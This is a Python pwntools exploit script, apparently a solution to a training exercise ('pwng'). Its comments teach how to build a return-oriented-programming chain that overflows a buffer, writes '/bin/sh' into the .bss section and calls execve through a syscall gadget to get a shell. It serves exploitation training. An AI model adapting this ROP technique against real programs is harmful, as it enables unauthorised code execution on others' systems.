#!/bin/python3

from pwn import *
context(arch="amd64")

p = process('./pwng')

# Introduction - In this last exercise there's no "/bin/sh" string and no "system()" call, so we'll have to perform those 2 things:
# 1) Write "/bin/sh\0" somewhere in memory using a write-what-where --> like we did in exercise pwnf!
# 2) Use a "syscall" gadget, with RAX loaded with code 0x3b to perform a "execve('/bin/sh', 0, 0)" --> like we did in exercise pwne!
#
# So this exercise is a kind of combination of skills seen/practised in pwne and pwnf. Please refer to them before starting this one.
# If you understood and passed those exercices, you'll be able to do this last one in the blink of an eye.



# Step 1 - Write "/bin/sh\0" somewhere in memory
# Let's start with finding a write-what-where gadget --> ropper -f pwng --search "mov [???], ???; ret;"
# Multiple results are shown, we'll keep this one: 0x0000000000410889: mov qword ptr [rsi], rdi; ret; 

# Why? Because we found corresponding pair of "pops" using --> ropper -f pwng --search "pop r?i; ret"
# Results:
# 0x0000000000401716: pop rdi; ret; 
# 0x00000000004068c8: pop rsi; ret;

pop_rdi_gadget = 0x401716
pop_rsi_gadget = 0x4068c8
write_rdiContent_at_rsiAddress = 0x410889



# Step 2 - Find at which address to write our string (find the "where")
# We just have to find a place in a section having "write" (w) permissions. 
# We can do so using IDA ("View" --> "Open subviews" --> "Segments" (shortcut SHIFT+F7)), or objdump (objdump -x vulnerableProgram | grep ".bss") to look notably in .bss section
# Personally I chose this place --> .bss:00000000004A7400

payload = b'A'*24

payload += p64(pop_rdi_gadget)
payload += p64(0x0068732f6e69622f) # pop "/bin/sh\0" (in little-endian) to RDI

payload += p64(pop_rsi_gadget)
payload += p64(0x4A7400) # pop the address where to write the string (0x4A7400) to RSI

payload += p64(write_rdiContent_at_rsiAddress) # write the string (the "what") to this address (the "where")



# Step 3 - Find a syscall gadget, and use it (with code 0x3b in RAX) to perform a "execve('/bin/sh', 0, 0)"
# We'll start with Step3-A by finding our "syscall" gadget, and our "pop rax" gadget to load 0x3b in RAX
#
# We search: ropper -f pwng --search "syscall"
# We obtain: 0x0000000000402294: syscall;
#
# Then we search: ropper -f pwng --search "pop rax" 
# And we obtain: 0x000000000040944c: pop rax; ret;

syscall_gadget = 0x402294
pop_rax_gadget = 0x40944c

# Now let's continue with Step3-B:
# - We must pop address of "/bin/sh\0" (= 0x4A7400) in RDI
# - We must pop 0 to RSI
# - We must pop 0 to RDX
# --> We obtain an execve('/bin/sh', 0, 0)!
#
# We already have pop rsi / pop rdi gadgets, we just need to find "pop rdx" --> ropper -f pwng --search "pop rdx"
# We obtain: 0x000000000043ce75: pop rdx; ret;

pop_rdx_gadget = 0x43ce75



# Step 4 - Let's resume/finish the construction of our payload

payload += p64(pop_rax_gadget)
payload += p64(0x3b) # pop 0x3b to RAX

payload += p64(pop_rdi_gadget)
payload += p64(0x4A7400) # pop the address of '/bin/sh' to RDI

payload += p64(pop_rsi_gadget)
payload += p64(0x0) # pop 0 to RSI

payload += p64(pop_rdx_gadget)
payload += p64(0x0) # pop 0 to RDX

payload += p64(syscall_gadget) # jump to the syscall gadget

print(p.recvline())
p.sendline(payload)
p.interactive()
